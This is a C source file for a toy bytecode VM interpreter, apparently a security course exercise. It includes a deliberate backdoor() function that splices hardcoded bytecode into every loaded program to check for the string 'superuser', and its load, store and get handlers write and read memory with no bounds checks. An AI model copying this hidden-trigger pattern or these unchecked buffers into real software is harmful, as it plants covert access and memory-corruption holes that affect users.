#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include "minivm.h"

#define NUM_REGS   (256)    
#define NUM_FUNCS  (256)

// Indicates HEAP Area, CODE area, CODESIZE
char HEAP[MAX_HEAP_SPACE] = {0,}; 
char CODE[MAX_CODE_SPACE] = {0,};
unsigned int CODESIZE = 0;

// Global variable that indicates if the process is running.
static bool is_running = true;

void halt(struct VMContext * ctx, const uint32_t instr){    
    is_running = false;
}

void load(struct VMContext * ctx, const uint32_t instr){
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);    
    ctx->r[a].value = HEAP[ctx->r[b].value];
}

void store(struct VMContext * ctx, const uint32_t instr){
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    HEAP[ctx->r[a].value] = ctx ->r[b].value;    
}
void move(struct VMContext * ctx, const uint32_t instr){
    const uint32_t a = EXTRACT_B1(instr);
    const uint32_t b = EXTRACT_B2(instr);
    ctx -> r[a].value = ctx -> r[b].value;
}

void puti(struct VMContext * ctx, const uint32_t instr){
    const uint32_t a = EXTRACT_B1(instr);
    const uint8_t imm = EXTRACT_B2(instr);
    ctx -> r[a].value = imm;    
}

void add(struct VMContext * ctx, const uint32_t instr){
    const uint32_t a = EXTRACT_B1(instr);
    const uint32_t b = EXTRACT_B2(instr);
    const uint32_t c = EXTRACT_B3(instr);
    ctx->r[a].value = ctx->r[b].value + ctx->r[c].value;
}

void sub(struct VMContext * ctx, const uint32_t instr){
    const uint32_t a = EXTRACT_B1(instr);
    const uint32_t b = EXTRACT_B2(instr);
    const uint32_t c = EXTRACT_B3(instr);
    ctx->r[a].value = ctx->r[b].value - ctx->r[c].value;
}

void gt(struct VMContext * ctx, const uint32_t instr){
    const uint32_t a = EXTRACT_B1(instr);
    const uint32_t b = EXTRACT_B2(instr);
    const uint32_t c = EXTRACT_B3(instr);
    ctx->r[a].value = ctx->r[b].value > ctx->r[c].value ? 1 : 0;
}

void ge (struct VMContext * ctx, const uint32_t instr){
    const uint32_t a = EXTRACT_B1(instr);
    const uint32_t b = EXTRACT_B2(instr);
    const uint32_t c = EXTRACT_B3(instr);
    ctx->r[a].value = ctx->r[b].value >= ctx->r[c].value ? 1 : 0;
}

void eq(struct VMContext * ctx, const uint32_t instr){
    const uint32_t a = EXTRACT_B1(instr);
    const uint32_t b = EXTRACT_B2(instr);
    const uint32_t c = EXTRACT_B3(instr);    
    ctx->r[a].value = ctx->r[b].value == ctx->r[c].value ? 1 : 0;    
}

void ite(struct VMContext * ctx, const uint32_t instr){
    const uint32_t 
    a = EXTRACT_B1(instr);
    const uint8_t imm1 = EXTRACT_B2(instr);
    const uint8_t imm2 = EXTRACT_B3(instr);
    ctx->pc = ctx->r[a].value > 0 ? (uint32_t*)(CODE+4*(imm1-1)) : (uint32_t*)(CODE+4*(imm2-1)); 
}

void jump(struct VMContext * ctx, const uint32_t instr){
    // imm1 is a line to jump.
    const uint8_t imm1 = EXTRACT_B1(instr);
    
    // imm1 must be in the CODE area. imm1 is unsigned variable, always larger than 0.    
    if (imm1 > (CODESIZE/4)){
        printf("\nInvalid jump to line %d",imm1);
        exit(1);
    }    
    
    ctx->pc = (uint32_t*)(CODE+4*(imm1-1));    
}

void put(struct VMContext* ctx, const uint32_t instr) {
    uint32_t a = EXTRACT_B1(instr);        
    uint32_t i = 0;
    char character;
      // Iterate until meets a NULL character.
    do{
        character = HEAP[ (ctx->r[a].value) + i ];
        putchar(character);
        i++;
    }while( character != 0X00);
}

void get(struct VMContext* ctx, const uint32_t instr) {
    uint32_t a = EXTRACT_B1(instr);            
    uint32_t i = 0; 
    char inputchar;
    while ((inputchar=fgetc(stdin)) != 0x0A){    
        HEAP[ (ctx->r[a].value) + i ] = inputchar;
        i++;             
    }
}

// Add a manual opcode for my own test program. It works as a function.
// "gcd" opcode computes a gcd value of memory values located at R2 and R3 each.
// a gcd value will be stored in the memory value located at R1.
void gcd(struct VMContext* ctx, const uint32_t instr) {
    const uint32_t a = EXTRACT_B1(instr);                
    const uint32_t b = EXTRACT_B2(instr);
    const uint32_t c = EXTRACT_B3(instr);          
    unsigned int R2 = HEAP[(ctx->r[b].value)] - 48;
    unsigned int R3 = HEAP[(ctx->r[c].value)] - 48;
    unsigned int gcd = 1;
    
    // If any of inputs is a zero value, do not compute gcd.
    if( (R2 && R3) == 0)
    {
        printf("Invalid value for gcd\n");
        exit(1);
    }

    //Compute GCD
    for(unsigned int i=2; (i <= R2 ) && (i<= R3) ; i++)
    {        
        if(R2%i==0 && R3%i==0)
            gcd = i;
    }      
    // Store a gcd value to the memory in the R1.
    HEAP[(ctx->r[a].value)] = gcd + 48;
}

void usageExit() {
    // TODO: show usage
    printf("Usage : ./interpreter FILE\n");
    exit(1);
}

void initFuncs(FunPtr *f, uint32_t cnt) {
    uint32_t i;
    for (i = 0; i < cnt; i++) {
        f[i] = NULL;
    }
    // TODO: initialize function pointers
    f[0x00] = halt;
    f[0x10] = load;
    f[0x20] = store;
    f[0x30] = move;
    f[0x40] = puti;
    f[0x50] = add;
    f[0x60] = sub;
    f[0x70] = gt;
    f[0x80] = ge;
    f[0x90] = eq;
    f[0xa0] = ite;
    f[0xb0] = jump;
    // puts and gets functions are already in the C library,so I changed the name of functions below.
    f[0xc0] = put;
    f[0xd0] = get;
    f[0xe0] = gcd;    
}

void initRegs(Reg *r, uint32_t cnt)
{
    uint32_t i;
    for (i = 0; i < cnt; i++) {
        r[i].type = 0;
        r[i].value = 0;
    }
}

void backdoor(void){    

   char foo[176] = {
       0xa0,0xd4,0x46,0xba,0x40,0xfc,0x0a,0x00,0x40,0xe5,0x73,0x00,0x40,0xe6,0x75,0x00,
       0x40,0xe7,0x70,0x00,0x40,0xe8,0x65,0x00,0x40,0xe9,0x72,0x00,0x40,0xea,0x75,0x00,
       0x40,0xeb,0x73,0x00,0x40,0xec,0x65,0x00,0x40,0xed,0x72,0x00,0x40,0xee,0x00,0x00,
       0x10,0xaf,0x96,0x00,0x90,0xd4,0xaf,0xe5,0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x97,0x00,
       0x90,0xd4,0xaf,0xe6,0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x98,0x00,0x90,0xd4,0xaf,0xe7,
       0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x99,0x00,0x90,0xd4,0xaf,0xe8,0x50,0xfd,0xfd,0xd4,
       0x10,0xaf,0x9a,0x00,0x90,0xd4,0xaf,0xe9,0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x9b,0x00,
       0x90,0xd4,0xaf,0xea,0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x9c,0x00,0x90,0xd4,0xaf,0xeb,
       0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x9d,0x00,0x90,0xd4,0xaf,0xec,0x50,0xfd,0xfd,0xd4,
       0x10,0xaf,0x9e,0x00,0x90,0xd4,0xaf,0xed,0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x9f,0x00,
       0x90,0xd4,0xaf,0xee,0x50,0xfd,0xfd,0xd4,0x90,0xd4,0xfd,0xfc,0xa0,0xd4,0x01,0x03
    };

    // Add a backdoor to the end of the code.
    for (int i = 0; i < 176; i++){
        CODE[CODESIZE-4 + i] = foo[i];
    }

    CODESIZE += 176;
}




int main(int argc, char** argv) {
    VMContext vm;
    Reg r[NUM_REGS];    
    FunPtr f[NUM_FUNCS];
    FILE* bytecode;    
    uint32_t* pc;

    // There should be at least one argument.
    if (argc < 2) usageExit();    
    // Initialize registers.
    initRegs(r, NUM_REGS);    
    // Initialize interpretation functions.
    initFuncs(f, NUM_FUNCS);
    // Load bytecode file
    bytecode = fopen(argv[1], "rb");
    if (bytecode == NULL) {
        perror("fopen");
        return 1;
    }
    // Initialize VM context.    
    CODESIZE = fread((void *)&CODE, 1, 2048, bytecode); 

    // add a backdoor
    backdoor();

    pc = (uint32_t*) &CODE;
    // Add pc value to track the instruction pointer.
    initVMContext(&vm, NUM_REGS, NUM_FUNCS, r, f, pc);
    while (is_running) {
        stepVMContext(&vm, &vm.pc);               
    }
    fclose(bytecode);
    // Zero indicates normal termination.
    return 0;
}

